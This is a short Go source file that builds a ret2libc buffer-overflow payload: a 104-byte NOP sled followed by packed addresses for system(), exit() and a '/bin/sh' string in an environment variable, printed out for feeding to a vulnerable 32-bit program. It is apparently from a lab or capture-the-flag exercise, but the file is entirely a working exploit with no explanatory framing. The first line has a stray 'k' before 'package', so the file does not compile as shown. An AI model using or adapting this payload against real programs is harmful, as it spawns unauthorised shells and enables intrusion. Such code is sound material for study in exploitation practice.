kpackage main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"strings"
)

func main() {

	var nopsleed = strings.Repeat("\x90", 104)
	var system uint32 = 0xf7e4de70
	var shellcode uint32 = 0xffffdf52 // mem address of export SHELLCODE=//////////////bin/sh
	var exit uint32 = 0xf7e40f50

	bufSystem := new(bytes.Buffer)
	binary.Write(bufSystem, binary.LittleEndian, &system) // struct.pack(<I, 0xf7e4de70)
	bufShellcode := new(bytes.Buffer)
	binary.Write(bufShellcode, binary.LittleEndian, &shellcode) // struct.pack(<I, 0xffffdf52)
	bufExit := new(bytes.Buffer)
	binary.Write(bufExit, binary.LittleEndian, &exit) // struct.pack(<I, 0xf7e40f50)

	//ret2libc system()+exit()+*shellcode()
	payload := nopsleed + string(bufSystem.Bytes()) + string(bufExit.Bytes()) + string(bufShellcode.Bytes())

	fmt.Printf(payload)
}

